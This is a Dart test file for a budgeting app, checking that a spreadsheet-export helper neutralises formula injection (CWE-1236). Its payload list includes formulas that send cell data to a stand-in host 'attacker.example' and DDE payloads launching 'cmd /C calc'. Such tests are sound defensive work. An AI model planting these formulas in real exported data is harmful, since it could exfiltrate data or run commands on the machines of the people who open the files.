import 'package:budgetsense/core/utils/spreadsheet_safety.dart';
import 'package:flutter_test/flutter_test.dart';

/// Security regression tests for spreadsheet formula injection (CWE-1236).
///
/// These assert the security PROPERTY - "a cell a spreadsheet would execute is
/// rendered as text instead" - rather than one specific escaping mechanism, so
/// the tests stay valid if the escaping strategy is ever changed.
void main() {
  group('SpreadsheetSafety.cell', () {
    test('neutralises every leading character a spreadsheet treats as formula',
        () {
      // The classic payloads: DDE command execution and the two formulas most
      // commonly used to exfiltrate a sheet over the network.
      const payloads = <String>[
        '=WEBSERVICE("http://attacker.example/?d="&A1)',
        '+SUM(A1)',
        '-2+3+cmd|\' /C calc\'!A0',
        '@SUM(1+1)*cmd|\' /C calc\'!A0',
        '=IMPORTXML("http://attacker.example","//x")',
        '\t=1+1',
        '\r=1+1',
        '\n=1+1',
      ];

      for (final payload in payloads) {
        final result = SpreadsheetSafety.cell(payload);
        expect(
          result.startsWith("'"),
          isTrue,
          reason: 'formula-capable cell was not neutralised: $payload',
        );
        // The original text must still be recoverable: this is a rendering
        // change, not data loss.
        expect(result.substring(1), payload);
      }
    });

    test('leaves ordinary user text untouched', () {
      const benign = <String>[
        'Coffee',
        'Groceries at the corner shop',
        "Sam's Club",
        'Rent (October)',
        'Refund #123',
        '1000',
        'café — naïve',
        '',
      ];

      for (final value in benign) {
        expect(
          SpreadsheetSafety.cell(value),
          value,
          reason: 'benign value should not be altered: $value',
        );
      }
    });

    test('only the leading position matters', () {
      // An '=' in the middle of a note is inert, so it must not be escaped.
      expect(SpreadsheetSafety.cell('total=5'), 'total=5');
      expect(SpreadsheetSafety.cell('a-b'), 'a-b');
    });

    test('is idempotent enough to be safe if applied twice', () {
      // An already-escaped value starts with an apostrophe, which is not a
      // formula trigger, so a second pass must be a no-op.
      final once = SpreadsheetSafety.cell('=1+1');
      expect(SpreadsheetSafety.cell(once), once);
    });
  });
}
